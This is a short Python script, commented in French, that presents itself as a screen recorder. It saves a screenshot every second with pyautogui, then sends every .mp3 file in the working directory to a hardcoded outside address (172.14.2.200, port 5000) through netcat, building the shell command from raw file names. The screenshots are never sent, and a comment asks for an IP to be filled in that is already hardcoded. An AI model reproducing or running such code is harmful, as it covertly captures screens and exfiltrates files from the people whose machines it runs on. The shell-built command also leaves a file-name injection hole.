import pyautogui
import time
import os
import subprocess
import glob

def screen_recorder(duration=10, interval=1, output_folder="screenshots"):
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        screenshot = pyautogui.screenshot()
        filename = f"{output_folder}/screenshot_{count}.png"
        screenshot.save(filename)
        count += 1
        time.sleep(interval)

if __name__ == "__main__":
    # Record screen for 10 seconds, taking a screenshot every second
    screen_recorder(duration=10, interval=1)

    # Envoi des fichiers .mp3 via netcat

    mp3_files = glob.glob("*.mp3")
    for mp3_file in mp3_files:
        # Remplacez 'DEST_IP' et 'DEST_PORT' par l'IP et le port du serveur netcat
        subprocess.run(f"nc 172.14.2.200 5000 < \"{mp3_file}\"", shell=True)